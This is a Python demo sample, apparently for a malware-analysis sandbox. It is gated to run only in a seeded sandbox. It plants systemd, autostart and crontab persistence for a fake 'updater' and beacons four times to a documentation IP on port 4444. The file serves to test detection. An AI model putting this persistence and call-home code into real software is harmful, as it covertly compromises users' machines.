# Demo sample for Detonation Ocean. Refuses to run outside the sandbox.
import os
import socket
import subprocess
import sys
import time

# Two conditions, both required: the sandbox marker, and a home directory that is the seeded one. Anything else exits here.
if os.environ.get("DETONATION_SANDBOX") != "1" or os.path.expanduser("~") != "/home/dana" or not os.path.isdir("/home/dana/Documents"):
    sys.exit(0)

home = "/home/dana"
unit = (
    "[Unit]\nDescription=Demo updater\n[Service]\nExecStart=/home/dana/Downloads/updater\nRestart=always\n"
    "[Install]\nWantedBy=default.target\n"
)
autostart = (
    "[Desktop Entry]\nType=Application\nName=Demo updater\nExec=/home/dana/Downloads/updater\n"
    "X-GNOME-Autostart-enabled=true\n"
)

# Persistence: a user unit and an autostart entry, both inside the sandbox home.
for relative, body in ((".config/systemd/user/updater.service", unit), (".config/autostart/updater.desktop", autostart)):
    path = os.path.join(home, relative)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(body)

# The usual registration commands. The image has neither systemd nor cron, so both fail; the attempt is the point.
for command in (["systemctl", "--user", "enable", "updater.service"], ["crontab", "-"]):
    try:
        subprocess.run(command, input=b"@reboot /home/dana/Downloads/updater\n", capture_output=True, timeout=3)
    except (OSError, subprocess.SubprocessError):
        pass

# Four short check-ins to a documentation address (RFC 5737, not routable). No network in the sandbox, so each is refused.
for _ in range(4):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect(("198.51.100.9", 4444))
    except OSError:
        pass
    try:
        sock.sendall(b"id=dana host=workstation checkin\n")
    except OSError:
        pass
    sock.close()
    time.sleep(1.2)
